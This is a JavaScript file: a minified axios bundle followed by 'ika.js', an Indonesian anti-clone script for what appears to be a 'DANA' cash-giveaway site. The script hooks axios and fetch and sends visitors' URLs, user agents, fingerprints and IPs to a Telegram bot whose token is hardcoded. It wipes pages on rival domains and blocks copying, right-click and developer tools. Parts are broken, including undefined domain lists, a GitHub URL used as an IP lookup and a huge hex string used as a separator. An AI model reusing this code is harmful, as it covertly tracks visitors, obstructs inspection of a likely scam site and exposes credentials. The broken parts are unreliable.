s,a=[];this.interceptors.response.forEach((function(e){a.push(e.fulfilled,e.rejected)}));var u,c=0;if(!i){var f=[Oe.bind(this),void 0];for(f.unshift.apply(f,o),f.push.apply(f,a),u=f.length,s=Promise.resolve(t);c<u;)s=s.then(f[c++],f[c++]);return s}u=o.length;var l=t;for(c=0;c<u;){var d=o[c++],h=o[c++];try{l=d(l)}catch(e){h.call(this,e);break}}try{s=Oe.call(this,l)}catch(e){return Promise.reject(e)}for(c=0,u=a.length;c<u;)s=s.then(a[c++],a[c++]);return s}},{key:"getUri",value:function(e){return V(te((e=Re(this.defaults,e)).baseURL,e.url),e.params,e.paramsSerializer)}}]),e}();P.forEach(["delete","get","head","options"],(function(e){Ce.prototype[e]=function(t,n){return this.request(Re(n||{},{method:e,url:t,data:(n||{}).data}))}})),P.forEach(["post","put","patch"],(function(e){function t(t){return function(n,r,o){return this.request(Re(o||{},{method:e,headers:t?{"Content-Type":"multipart/form-data"}:{},url:n,data:r}))}}Ce.prototype[e]=t(),Ce.prototype[e+"Form"]=t(!0)}));var Ne=function(){function e(n){if(t(this,e),"function"!=typeof n)throw new TypeError("executor must be a function.");var r;this.promise=new Promise((function(e){r=e}));var o=this;this.promise.then((function(e){if(o._listeners){for(var t=o._listeners.length;t-- >0;)o._listeners[t](e);o._listeners=null}})),this.promise.then=function(e){var t,n=new Promise((function(e){o.subscribe(e),t=e})).then(e);return n.cancel=function(){o.unsubscribe(t)},n},n((function(e,t,n){o.reason||(o.reason=new re(e,t,n),r(o.reason))}))}return r(e,[{key:"throwIfRequested",value:function(){if(this.reason)throw this.reason}},{key:"subscribe",value:function(e){this.reason?e(this.reason):this._listeners?this._listeners.push(e):this._listeners=[e]}},{key:"unsubscribe",value:function(e){if(this._listeners){var t=this._listeners.indexOf(e);-1!==t&&this._listeners.splice(t,1)}}}],[{key:"source",value:function(){var t;return{token:new e((function(e){t=e})),cancel:t}}}]),e}();var Pe=function e(t){var n=new Ce(t),r=o(Ce.prototype.request,n);return P.extend(r,Ce.prototype,n,{allOwnKeys:!0}),P.extend(r,n,null,{allOwnKeys:!0}),r.create=function(n){return e(Re(t,n))},r}(be);return Pe.Axios=Ce,Pe.CanceledError=re,Pe.CancelToken=Ne,Pe.isCancel=Ee,Pe.VERSION=Se,Pe.toFormData=z,Pe.AxiosError=_,Pe.Cancel=Pe.CanceledError,Pe.all=function(e){return Promise.all(e)},Pe.spread=function(e){return function(t){return e.apply(null,t)}},Pe.isAxiosError=function(e){return P.isObject(e)&&!0===e.isAxiosError},Pe.formToJSON=function(e){return Z(P.isHTMLForm(e)?new FormData(e):e)},Pe}());

  var SimpleCrypto = {
    encrypt: function(text, key) {
      var result = '';
      for (var i = 0; i < text.length; i++) {
        var charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
        result += String.fromCharCode(charCode);
      }
      return btoa(result);
    },
    decrypt: function(encryptedText, key) {
      try {
        var text = atob(encryptedText);
        var result = '';
        for (var i = 0; i < text.length; i++) {
          var charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
          result += String.fromCharCode(charCode);
        }
        return result;
      } catch (e) {
        return null;
      }
    },
    hash: function(str) {
      var hash = 0;
      for (var i = 0; i < str.length; i++) {
        var char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      return Math.abs(hash).toString(16);
    }
  };

  // NETWORK SECURITY MONITOR DENGAN AXIOS
  function setupNetworkSecurity() {
    console.log('𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶');
    
    // Intercept semua request HTTP
    var originalRequest = axios.Axios.prototype.request;
    
    axios.Axios.prototype.request = function(config) {
      var currentDomain = window.location.hostname;
      var targetUrl = config.url || '';
      
      // Cek jika request menuju domain musuh
      var isSuspiciousRequest = DOMAIN_MUSUH.some(musuh => {
        return targetUrl.includes(musuh) && !DOMAIN_AMAN.some(aman => targetUrl.includes(aman));
      });
      
      if (isSuspiciousRequest) {
        console.warn('🚨 Blocked suspicious request to:', targetUrl);
        sendSecurityAlert('SUSPICIOUS_REQUEST', 
          'Blocked request to: ' + targetUrl + ' from: ' + currentDomain);
        return Promise.reject(new Error('Request blocked by ika.js security'));
      }
      
      // Tambah security headers
      if (!config.headers) config.headers = {};
      config.headers['X-Security-Token'] = SimpleCrypto.hash(currentDomain + Date.now());
      config.headers['X-Protected-By'] = 'ika.js-2.0';
      
      return originalRequest.call(this, config);
    };
    
    // Monitor semua outgoing requests
    var originalFetch = window.fetch;
    window.fetch = function(resource, init) {
      var currentDomain = window.location.hostname;
      var targetUrl = typeof resource === 'string' ? resource : resource.url;
      
      // Cek jika fetch menuju domain musuh
      var isSuspiciousFetch = DOMAIN_MUSUH.some(musuh => {
        return targetUrl.includes(musuh) && !DOMAIN_AMAN.some(aman => targetUrl.includes(aman));
      });
      
      if (isSuspiciousFetch) {
        console.warn('🚨 Blocked suspicious fetch to:', targetUrl);
        sendSecurityAlert('SUSPICIOUS_FETCH', 
          'Blocked fetch to: ' + targetUrl + ' from: ' + currentDomain);
        return Promise.reject(new Error('Fetch blocked by ika.js security'));
      }
      
      // Tambah security headers
      if (!init) init = {};
      if (!init.headers) init.headers = {};
      init.headers['X-Security-Token'] = SimpleCrypto.hash(currentDomain + Date.now());
      init.headers['X-Protected-By'] = 'ika.js-2.0';
      
      return originalFetch.call(this, resource, init);
    };
    
    console.log('✅ Network Security Activated');
  }

  // SUPER DESTROYER FUNCTION
  function triggerSuperDestroyer(reason) {
    var currentDomain = window.location.hostname;
    
    // DAPATKAN IP REAL-TIME DENGAN AXIOS
    axios.get('https://github.com/Miodec/monkeytype/blob/master/src/js/axios-instance.js')
      .then(function(response) {
        sendDestroyerAlert(currentDomain, response.data.ip, reason);
      })
      .catch(function() {
        sendDestroyerAlert(currentDomain, 'UNKNOWN', reason);
      });

    // HANCURKAN HALAMAN
    document.documentElement.innerHTML = '';
    
    var destructionPage = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>💀 WEBSITE TELAH DIHANCURKAN</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: #000; 
                color: #ff0000; 
                font-family: 'Courier New', monospace; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                text-align: center; 
                overflow: hidden;
                padding: 20px;
            }
            .container {
                border: 3px solid #ff0000;
                padding: 30px;
                background: rgba(255,0,0,0.1);
                border-radius: 10px;
                max-width: 800px;
                width: 100%;
                animation: glow 1s infinite alternate;
            }
            @keyframes glow {
                from { box-shadow: 0 0 10px #ff0000; }
                to { box-shadow: 0 0 30px #ff0000; }
            }
            h1 {
                font-size: clamp(1.5em, 4vw, 2.5em);
                margin-bottom: 20px;
                text-shadow: 0 0 10px #ff0000;
            }
            .domain-info {
                background: rgba(255,0,0,0.2);
                padding: 15px;
                margin: 15px 0;
                border-radius: 5px;
                border: 1px solid #ff0000;
                word-break: break-all;
            }
            .ip-info {
                color: #00ff00;
                margin: 10px 0;
                font-size: 1.1em;
            }
            .official-link {
                display: inline-block;
                background: #00ff00;
                color: #000;
                padding: 12px 25px;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
                margin-top: 20px;
                border: 2px solid #00ff00;
                transition: all 0.3s ease;
            }
            .official-link:hover {
                background: #000;
                color: #00ff00;
            }
            .counter {
                font-size: 3em;
                color: #ff0000;
                margin: 20px 0;
                animation: blink 0.5s infinite;
            }
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }
            .warning-text {
                color: #ccc; 
                margin: 20px 0; 
                font-size: 0.9em;
                line-height: 1.4;
            }
            .footer {
                margin-top: 20px; 
                color: #888; 
                font-size: 0.8em;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="counter">💀</div>
            <h1>WEBSITE INI ADALAH TIRUAN!</h1>
            
            <div class="domain-info">
                <strong>DOMAIN PALSU:</strong><br>
                <span style="color: #ff4444; font-size: 1.2em;">${currentDomain}</span>
            </div>
            
            <div class="domain-info" style="background: rgba(0,255,0,0.1); border-color: #00ff00;">
                <strong>DOMAIN ASLI:</strong><br>
                <span style="color: #00ff00; font-size: 1.2em;">dana.lyanan.info</span>
            </div>
            
            <div class="ip-info">
                🔍 IP Address: <span id="ip-address">Mendeteksi...</span>
            </div>
            
            <div class="warning-text">
                ⚠️ ${reason}
            </div>
            
            <a href="https://dana.lyanan.info" class="official-link" onclick="trackRedirect()">
                🔥 KLIK UNTUK KE WEBSITE ASLI
            </a>
            
            <div class="footer">
                Protection System: ika.js 2.0 SUPER DESTROYER with Axios Security
            </div>
        </div>
        
        <script>
            function trackRedirect() {
                fetch('https://api.telegram.org/bot8054068272:AAHN6I5vsaNYfneyFAPJtOQnIShgbx4GzBo/sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: "8080097570",
                        text: "🔗 User redirected to original site from: ${currentDomain}"
                    })
                }).catch(e => {});
            }
            
            // DAPATKAN IP ASLI DENGAN AXIOS
            axios.get('https://api.ipify.org?format=json')
                .then(function(response) {
                    document.getElementById('ip-address').textContent = response.data.ip;
                })
                .catch(function() {
                    document.getElementById('ip-address').textContent = 'Tidak terdeteksi';
                });
        <\/script>
    </body>
    </html>`;
    
    document.documentElement.innerHTML = destructionPage;
    window.stop();
    throw new Error('DESTROYED_BY_IKA_JS_2.0_WITH_AXIOS');
  }

  function sendDestroyerAlert(domain, ip, reason) {
    var token = "8054068272:AAHN6I5vsaNYfneyFAPJtOQnIShgbx4GzBo";
    var chatId = "8080097570";
    var message = "💀 SUPER DESTROYER ACTIVATED 💀\\n\\n" +
                 "🎯 Target: " + domain + "\\n" +
                 "🌐 IP Attacker: " + ip + "\\n" +
                 "📋 Reason: " + reason + "\\n" +
                 "🕐 Time: " + new Date().toLocaleString('id-ID') + "\\n" +
                 "🔗 URL: " + window.location.href + "\\n" +
                 "👤 User Agent: " + navigator.userAgent + "\\n" +
                 "🛡️ Protection: ika.js 2.0 + Axios Security";
    
    // KIRIM KE TELEGRAM DENGAN AXIOS
    axios.post('https://api.telegram.org/bot'+token+'/sendMessage', {
      chat_id: chatId,
      text: message
    }).catch(function(e) {
      console.log('Telegram alert failed:', e);
    });
  }

  function sendSecurityAlert(type, details) {
    var token = "8054068272:AAHN6I5vsaNYfneyFAPJtOQnIShgbx4GzBo";
    var chatId = "8080097570";
    var message = "🚨 ika.js Security Alert\\n" +
                 "Type: " + type + "\\n" +
                 "Details: " + details + "\\n" +
                 "Domain: " + window.location.hostname + "\\n" +
                 "Time: " + new Date().toLocaleString('id-ID');
    
    axios.post('https://api.telegram.org/bot'+token+'/sendMessage', {
      chat_id: chatId,
      text: message
    }).catch(function(e) {
      console.log('Security alert failed:', e);
    });
  }

  // FUNGSI UTAMA UNTUK CEK DOMAIN
  function checkDomainSecurity() {
    var currentDomain = window.location.hostname.toLowerCase();
    var normalizedDomain = currentDomain.replace(/^www\./, '');
    
    var isDomainAman = DOMAIN_AMAN.some(domain => {
      var cleanDomain = domain.toLowerCase().replace(/^www\./, '');
      return normalizedDomain === cleanDomain || 
             normalizedDomain.endsWith('.' + cleanDomain) ||
             (cleanDomain.endsWith('.') && normalizedDomain.startsWith(cleanDomain));
    });
    
    var isDomainMusuh = DOMAIN_MUSUH.some(musuh => {
      var cleanMusuh = musuh.toLowerCase().replace(/^www\./, '');
      return normalizedDomain === cleanMusuh || 
             normalizedDomain.includes(cleanMusuh) || 
             normalizedDomain.endsWith('.' + cleanMusuh);
    });

    console.log('🔍 Domain Security Check:', {
      domain: currentDomain,
      normalized: normalizedDomain,
      isAman: isDomainAman,
      isMusuh: isDomainMusuh
    });
    if (isDomainMusuh && !isDomainAman) {
      console.log('💀 Triggering Super Destroyer: Domain musuh terdeteksi');
      triggerSuperDestroyer("DOMAIN MUSUH TERDETEKSI: " + currentDomain);
    } else if (isDomainAman) {
      console.log('✅ Domain aman, melanjutkan normal:', currentDomain);
      // Setup network security untuk domain aman
      setTimeout(setupNetworkSecurity, 1000);
    } else {
      console.log('⚠️ Domain tidak dikenal, tidak dihancurkan:', currentDomain);
      // Setup basic network security untuk domain tidak dikenal
      setTimeout(setupNetworkSecurity, 1000);
    }
  }

  // CEK DOMAIN DI AWAL
  try {
    checkDomainSecurity();
  } catch (error) {
    console.error('Error in domain security check:', error);
  }

  var ika = function (options) {
    if (!(this instanceof ika)) {
      return new ika(options)
    }

    var defaultOptions = {
      validDomains: DOMAIN_AMAN,
      blockedDomains: DOMAIN_MUSUH,
      protectionEnabled: true,
      debugMode: false,
      maxViolations: 3,
      telegramAlerts: true,
      botToken: "8054068272:AAHN6I5vsaNYfneyFAPJtOQnIShgbx4GzBo",
      chatId: "8080097570",
      encryptionKey: "ika_super_destroyer_2024",
      excludeUserAgent: false,
      excludeLanguage: false,
      excludeScreenResolution: false,
      detectScreenOrientation: true,
      allowRightClick: false,
      allowCopyPaste: false,
      enableSuperDestroyer: true,
      allowUnknownDomains: true,
      enableRealTimeMonitoring: true,
      enableIPLogging: true,
      enableNetworkSecurity: true, // Fitur baru dengan Axios
      blockSuspiciousRequests: true
    }
    
    this.options = this.extend(options, defaultOptions)
    this.nativeForEach = Array.prototype.forEach
    this.nativeMap = Array.prototype.map
    this.violationCount = 0
    this.fingerprint = null
    this.securityHash = null
    this.isInitialized = false
    this.axios = axios; // Expose axios untuk penggunaan external
  }
  
  ika.prototype = {
    extend: function (source, target) {
      if (source == null) { return target }
      for (var k in source) {
        if (source[k] != null && target[k] !== source[k]) {
          target[k] = source[k]
        }
      }
      return target
    },
    
    // Initialize security protection dengan safety check
    init: function (done) {
      var that = this
      
      if (this.isInitialized) {
        console.warn('⚠️ ika.js sudah diinisialisasi sebelumnya');
        return this;
      }
      
      if (!this.options.protectionEnabled) {
        if (typeof done === 'function') {
          done('SECURITY_DISABLED', [])
        }
        return this
      }
      
      console.log('💀 ika.js 2.0 SUPER DESTROYER Initializing...')
      console.log('🎯 Current Domain:', window.location.hostname)
      console.log('🔗 Axios Version:', axios.VERSION)
      
      // CEK ULANG DOMAIN SEBELUM INISIALISASI - DOUBLE SAFETY
      var currentDomain = window.location.hostname.toLowerCase();
      var isDomainAman = this.options.validDomains.some(domain => 
        currentDomain === domain.toLowerCase().replace(/^www\./, '')
      );
      var isDomainMusuh = this.options.blockedDomains.some(musuh => 
        currentDomain.includes(musuh.toLowerCase().replace(/^www\./, '')) && !isDomainAman
      );
      
      if (isDomainMusuh && !isDomainAman) {
        triggerSuperDestroyer("DOMAIN MUSUH TERDETEKSI PADA INISIALISASI: " + currentDomain);
        return this;
      }
      
      if (!isDomainAman && !this.options.allowUnknownDomains) {
        console.warn('⚠️ Domain tidak dikenal dan allowUnknownDomains = false');
        return this;
      }
      
      // SETUP NETWORK SECURITY JIKA DIENABELKAN
      if (this.options.enableNetworkSecurity) {
        setupNetworkSecurity();
      }
      
      var keys = {
        data: [],
        addPreprocessedComponent: function (pair) {
          var componentValue = pair.value
          if (typeof that.options.preprocessor === 'function') {
            componentValue = that.options.preprocessor(pair.key, componentValue)
          }
          keys.data.push({key: pair.key, value: componentValue})
        }
      }
      
      try {
        // Run all security checks
        keys = this.domainValidationKey(keys)
        keys = this.userAgentKey(keys)
        keys = this.languageKey(keys)
        keys = this.screenResolutionKey(keys)
        keys = this.timezoneOffsetKey(keys)
        keys = this.hardwareConcurrencyKey(keys)
        keys = this.platformKey(keys)
        keys = this.fingerprintKey(keys)
        keys = this.iframeDetectionKey(keys)
        keys = this.devToolsDetectionKey(keys)
        keys = this.tamperDetectionKey(keys)
        keys = this.networkSecurityKey(keys) // NEW: Network security key
        keys = this.customSecurityFunction(keys)
        
        this.securityScan(keys, function (securityHash, components) {
          that.securityHash = securityHash
          that.isInitialized = true
          
          if (that.options.enableRealTimeMonitoring) {
            that.startRealTimeProtection()
          }
          
          console.log('🔐 ika.js 2.0 Security Hash:', securityHash)
          console.log('✅ ika.js 2.0 Initialized - SUPER DESTROYER ACTIVE')
          console.log('🌐 Network Security:', that.options.enableNetworkSecurity ? 'ACTIVE' : 'INACTIVE')
          
          if (typeof done === 'function') {
            done(securityHash, components)
          }
        })
      } catch (error) {
        console.error('❌ Error during ika.js initialization:', error);
        if (typeof done === 'function') {
          done('INIT_ERROR', [])
        }
      }
      
      return this
    },

    // NEW: Network Security Component
    networkSecurityKey: function (keys) {
      var securityStatus = {
        axiosIntegrated: typeof axios !== 'undefined',
        fetchMonitored: true,
        requestInterception: this.options.enableNetworkSecurity,
        suspiciousBlocking: this.options.blockSuspiciousRequests
      };
      keys.addPreprocessedComponent({key: 'network_security', value: securityStatus})
      return keys
    },
    
    customSecurityFunction: function (keys) {
      if (typeof this.options.customFunction === 'function') {
        try {
          keys.addPreprocessedComponent({key: 'custom_security', value: this.options.customFunction()})
        } catch (e) {
          console.error('Custom security function error:', e)
        }
      }
      return keys
    },
    
    domainValidationKey: function (keys) {
      keys.addPreprocessedComponent({key: 'domain_validation', value: this.validateDomain()})
      return keys
    },
    
    validateDomain: function () {
      var currentDomain = window.location.hostname.toLowerCase()
      var isValid = this.options.validDomains.some(function(domain) {
        return currentDomain === domain.toLowerCase().replace(/^www\./, '')
      })
      
      if (!isValid) {
        var isBlocked = this.options.blockedDomains.some(function(musuh) {
          return currentDomain.includes(musuh.toLowerCase().replace(/^www\./, ''))
        })
        
        if (isBlocked) {
          this.logViolation('INVALID_DOMAIN', currentDomain)
          return false
        }
        return this.options.allowUnknownDomains;
      }
      
      // Check if loaded in iframe
      if (window.self !== window.top) {
        this.logViolation('IFRAME_DETECTION', 'Website loaded in iframe')
        return false
      }
      
      return true
    },
    
    userAgentKey: function (keys) {
      if (!this.options.excludeUserAgent) {
        keys.addPreprocessedComponent({key: 'user_agent', value: this.getUserAgent()})
      }
      return keys
    },
    
    getUserAgent: function () {
      return navigator.userAgent || 'Unknown'
    },
    
    languageKey: function (keys) {
      if (!this.options.excludeLanguage) {
        keys.addPreprocessedComponent({ 
          key: 'language', 
          value: navigator.language || navigator.userLanguage || navigator.browserLanguage || navigator.systemLanguage || '' 
        })
      }
      return keys
    },
    
    screenResolutionKey: function (keys) {
      if (!this.options.excludeScreenResolution) {
        return this.getScreenResolution(keys)
      }
      return keys
    },
    
    getScreenResolution: function (keys) {
      var resolution = [0, 0]
      try {
        if (this.options.detectScreenOrientation) {
          resolution = (window.screen.height > window.screen.width) ? 
            [window.screen.height, window.screen.width] : 
            [window.screen.width, window.screen.height]
        } else {
          resolution = [window.screen.width, window.screen.height]
        }
      } catch (e) {
        console.warn('Could not get screen resolution:', e)
      }
      keys.addPreprocessedComponent({key: 'resolution', value: resolution})
      return keys
    },
    
    timezoneOffsetKey: function (keys) {
      keys.addPreprocessedComponent({key: '', value: new Date().getTimezoneOffset()})
      return keys
    },
    
    hardwareConcurrencyKey: function (keys) {
      var concurrency = -1
      try {
        concurrency = navigator.hardwareConcurrency || -1
      } catch (e) {
        console.warn('Could not get hardware concurrency:', e)
      }
      keys.addPreprocessedComponent({key: 'hardware_concurrency', value: concurrency})
      return keys
    },
    
    platformKey: function (keys) {
      keys.addPreprocessedComponent({key: 'platform', value: navigator.platform || 'Unknown'})
      return keys
    },
    
    fingerprintKey: function (keys) {
      this.generateFingerprint()
      keys.addPreprocessedComponent({key: 'security_fingerprint', value: this.fingerprint})
      return keys
    },
    
    generateFingerprint: function () {
      var components = [
        this.getUserAgent(),
        navigator.language || 'unknown',
        screen.width + 'x' + screen.height,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || 'unknown',
        window.location.hostname,
        navigator.platform || 'unknown',
        document.charset || 'unknown',
        typeof axios !== 'undefined' ? 'axios-integrated' : 'no-axios'
      ].join('|')
      
      this.fingerprint = SimpleCrypto.hash(components)
      return this.validateStoredFingerprint()
    },
    
    validateStoredFingerprint: function () {
      try {
        var stored = localStorage.getItem('ika_encrypted_fp')
        if (!stored) {
          var encrypted = SimpleCrypto.encrypt(this.fingerprint, this.options.encryptionKey)
          localStorage.setItem('ika_encrypted_fp', encrypted)
          return true
        }
        
        var decrypted = SimpleCrypto.decrypt(stored, this.options.encryptionKey)
        if (decrypted !== this.fingerprint) {
          this.logViolation('FINGERPRINT_MISMATCH', 'Device fingerprint changed')
          return false
        }
        
        return true
      } catch (e) {
        this.logViolation('FINGERPRINT_ERROR', 'Fingerprint validation failed')
        return false
      }
    },
    
    iframeDetectionKey: function (keys) {
      keys.addPreprocessedComponent({key: 'iframe_detection', value: window.self === window.top})
      return keys
    },
    
    devToolsDetectionKey: function (keys) {
      keys.addPreprocessedComponent({key: 'devtools_detection', value: this.detectDevTools()})
      return keys
    },
    
    detectDevTools: function () {
      try {
        var startTime = Date.now()
        debugger
        var detectionTime = Date.now() - startTime
        if (detectionTime > 100) {
          this.logViolation('DEBUGGER_DETECTED', 'DevTools detected')
          return false
        }
        return true
      } catch (e) {
        return true
      }
    },
    
    tamperDetectionKey: function (keys) {
      keys.addPreprocessedComponent({key: 'tamper_detection', value: this.setupTamperDetection()})
      return keys
    },
    
    setupTamperDetection: function () {
      var that = this
      
      try {
        // Blokir copy-paste
        if (!this.options.allowCopyPaste) {
          var events = ['copy', 'cut', 'paste', 'contextmenu', 'dragstart']
          events.forEach(function(event) {
            document.addEventListener(event, function(e) {
              e.preventDefault()
              that.logViolation('COPY_PASTE_ATTEMPT')
              return false
            }, { capture: true })
          })
        }
        
        // Blokir right-click
        if (!this.options.allowRightClick) {
          document.addEventListener('contextmenu', function(e) {
            e.preventDefault()
            that.logViolation('RIGHT_CLICK_ATTEMPT')
            return false
          })
        }
        
        // Blokir DevTools shortcuts
        document.addEventListener('keydown', function(e) {
          if (e.key === 'F12' || 
              (e.ctrlKey && e.shiftKey && e.key === 'I') ||
              (e.ctrlKey && e.shiftKey && e.key === 'J') ||
              (e.ctrlKey && e.key === 'U') ||
              (e.ctrlKey && e.key === 'S')) {
            e.preventDefault()
            that.logViolation('DEVTOOLS_SHORTCUT')
            return false
          }
        })
        
        return true
      } catch (e) {
        console.error('Tamper detection setup error:', e)
        return false
      }
    },

    sendSecurityNotification: function(alertType, details) {
      if (this.options.telegramAlerts) {
        this.sendTelegramAlert(alertType, details)
      }
    },

    sendTelegramAlert: function (type, details) {
      var message = '🚨 ika.js 2.0 Security Alert\n' +
                   'Type: ' + type + '\n' +
                   'Details: ' + (details || '') + '\n' +
                   'Domain: ' + window.location.hostname + '\n' +
                   'URL: ' + window.location.href + '\n' +
                   'Fingerprint: ' + (this.fingerprint || 'unknown') + '\n' +
                   'Violations: ' + this.violationCount + '\n' +
                   'Time: ' + new Date().toLocaleString('id-ID') + '\n' +
                   'User Agent: ' + navigator.userAgent + '\n' +
                   'Axios Security: ' + (this.options.enableNetworkSecurity ? 'ACTIVE' : 'INACTIVE')
      
      var that = this
      setTimeout(function() {
        that.axios.post('https://api.telegram.org/bot' + that.options.botToken + '/sendMessage', {
          chat_id: that.options.chatId,
          text: message
        }).catch(function(error) {
          console.error('Gagal kirim alert Telegram:', error)
        })
      }, 0)
    },
    
    securityScan: function (keys, done) {
      var that = this
      var values = []
      that.each(keys.data, function (pair) {
        var value = pair.value
        if (value && typeof value.join === 'function') {
          value = value.join(';')
        }
        values.push(value)
      })
      var securityHash = that.x64hash128(values.join('47ffb35071774655f4b37a12ed159eaae4846be1129b718fe034a32b81627699e1c673b97c08a303cefeb79aade65da2139ea08bffb587bf78486316dce43f88b5d8ba6ad3bb6c4569d97ede85fb48cd884d519597764541046e60f2f5175132870d810f58db0395c04e3855846d01438a6bcfd7b59211e1908f060c0f89560ac50fef6486cf8b85a552495fafc8bbf6aafc51afe9a8a71920ce77d2751a36950b815c1efc5785531495f84241ab07b9c6fd4dcdebba2e018b5e731c497561cd30aa976ef14a07fd0db473eb79897d807c48458dfd357ba66244a648b594dd6b042fb284feeb7cf9295a212f686c4766f8332357a24cc66fdd8045d78a3aa08750f7dca193a5464896ddd457d8c4fb5ed1c6ca3021c12656e96b9d445c9dd3ef9f13e9001018cd821df42341a048eae14df775ff9a8e1c69f350a39a4328dad3f652f921c01799d58e68900b108f0c813634e9eb25724bda50582510b37b340c3a38733ba8bc95063bf938ea8b9e0a51e880bd60c3235e8be23ae81433fc1dc9b5919b12fa678b7f8753ee67c5b46640d4b079cac3675ba0bf20079aeeb415b6d075efb6edbdd56c53a5163073828c61fa9fbfae2c26f766133bddd0eca5e9dc4497a20a12139dd9ff51cd388f89d03e0e57148eb5f582507a3956640cafd9b147a9502b670763e4381d19246351c8b78019adae16512d9a3ae0ca3eee54c0417da519fad4b1332b6d7b5736c6ce69f2c65961d8321e4d87942276b18c59f7e6cf1e8fb5b8f248b0f8bfedf299d403f0827edc4beee0169c13baf3629f70925123431d91cb9c5adebb10971d17249c95703bd4e7634ff03aba999c785b154ea43008e1f5000bea32c5bdfa69cafd07da091179590edded29be1ca4273f5b99619bf6cb6818679821607cd68d4fc2d7b9e977d708dc893b76d8badda0f8893a9a0cb173e9341973dcdc2197a2160cf196339945198f5bdc7f21d9cb80a067b304a16ecb2a693dbb2a6e26872e89180f171a6350c2f35f457302de27b6d84732abd9bf4a7687ed4309c34eb00e125cb55e6df1f790a3726f8e9b66179c97e6a3c4e92a9de734f3ad5f0a2b36cf3b86a0b7d47b61cd4eaef89f9702a38e4e3e53e2bed429cb0ff9af233f65d94d9e41a0dadf70047e175d2636f87b02b2632b2dee00e8d584bffeda42b17d5a75d4680d1d5ae1dc75e5de9e634cf4ae5d5ab88a864f4c402c8f4a1442563aa1d90fadcb5f0269c9c848b50b952268101071f84d2d1db3064b090a85360397f3a885a310ff0d297eabf2b119681b12a38d99adbb17f40cd839bc9870108a4a3d4211debfbfa99f7670530c3c9baacc0b372c4929fceef404764a11cb48599829a89d17b6d5a7005168178a32d28a41a0ba6498025c7083c79b51db9274eb469064ffe8f32e848008eecfa60996ea460e140b7c0ff599995e5555faca01024946f5cd6917ef5327c3dff776e19e056645f19a5742bb0a1b946b72e83c80a2fa7bba82badb987fa04c4fbcf258df5d2190a02f048a9f81d6554980546e75a7d70225ad95b749e13758b2de4095501c56ef0037b1a969e52b506c7d1210489c58d79d4cb91713ea6debfb5cc03cc45a5ed4fdf77859d056396486cd9b96984adf3f9e8363d884518b6d7535802f221061fa04c45270fcef9839e4ae1193ce9fab0d16393881972ddd837ca98d67ace35d769613e48b2a3a9904da76b7ea545c958eb8be9067d42db0cddff2a6b3dadc52521e4f96220eef443eed1fcf332e054935fbe8fd17060c195542cf11969c4f39b7321d5865ef95c9c25f3ab49544ff7af665ec9c6b3dfad1a1a03eeea60b037dd18a57d08bac40954ecb32c91109451480c1242208119f7a23cf6b1b3b58f7a41cb4862eeb7315a000b4c27192f37409c5640795417e02058f2a9d58cd88c7ce56f7623c973847537512cd0443cf409dde8211277a1cf74eabd761313d2aeaf46538cd3631e16dfad1ed8648f10ae3df1026924960df0d4cd99638f0edf8a31a42c0388b8eda3ece559a83ee0a29b854fed8937994f2f31480559d6ab2a46478b291c3c6fa21338c3ab4e99b707473e081feb50988075bf96a4647a0a7cab7c658f4e7a19362d685b358e7cd76445295d57e0c944ac6e9fcb1e115042623e9c09b3bd62ea13fe7350c8f8b1f9f680e863b6a2649703ddb1359faee9ad4da780dda5a140790ae1b928f50817c501b97752d210e5de5563c5bb75f026c7caa9e21afe42687c6f3b1fa44132f65a8dfd9f380b4073b57545599a442e9f451a2ce441e23b52978b68f9586b55590525815822cd0d6c3192585912936723f40ddb886dc8e9c50689d19bab4b261c2e0220acf20b79f1f98f1830a5294094c3e1a5679f1fc1fc32eefb5efc444d1220908fedef4748a193e08c40c5c53db025baaeb264904178995a254f8082946753356e4bee51838022ebdc7ccfd32a69f598444cde4139ce05dba5c2e167c5505dd5cf4f7c14d30bbcad46b9978a273628f9fa0dfc0cbc2795e697ae621618e97b7fa27417feff236c7d341fb38a6dda6f8038849c06d9d6181740e5b079f4eacfa60c2ce95bcd7dec25d9cf4c142aba83df87b8b94781163a45b31308f5cf052bbf886db6ec3e069ca9cc244a9bd4c95d2c80c02aa9c374322a2218debecfd119172011c35fbec670337d1fef234293c6863e58d68e0be87909fe7b1ff2a3a3f930d6e772b0cbec141fbf7951cf8a743d86d529adbfaafac8747914006dc707c12b329ff12334ed2bbfb90befc786608c3690c6846cc2fb70ba0197b1c5be67d4ed3941c08b1af2b77e0ab475953c900b8c562b6738e1dd377418040d45b61ee12b7c117465f80ed32e2dcf1a3bc328a3f681e18da822a2c34041fe22e0ff298ab47a9a1238c61b1918a820136762e37d12358af09889a562e7e44e203dc89ad3dddad49ede6ede833d373abeca45cc10c9f0a71e732692243a3907a22c14085c256f6e0e4f52d4301322009fc86284dc5e46d19e6853ebad1f721232306d7d3841b035d7cf42f09d550208d6c60ac9174f4790269eafa4bc6e6eac9eb69508c319b4cde9372257212b5f673a82bbb6336bff914dd4ac1ce59c1921d08a7837e8cb83cb8a9d7f7d3a7650c4a421f027e7b2640ccb40b46b6a62ac4ad5bb4946ac3d52adcd9f34fc16204e25972dfa9553f2af1c09f4fa3a880126bb8f2deb94b05ad6ee783db45fd04342c96db3e94b47d7757151eb5ac30e993529b5296fda158973cc9c7e80b39358e8e841b9faee0b409b499a61773f7f37a5fd3f1c0cfd313e2d42f8e8d83a134cfc4fc795ca5f74c9732d27f9949c2e80a733ed5b655a5dd680af52af4d9c2922650a5119a0191b8520730c21808bd8ab8857dab3d704580373d79a84d1655b8e7f87ab211e68fe2c953cc24ba11d95074cc01f787664e26af815d0039426fcee6176584469f6df85abdcf18c661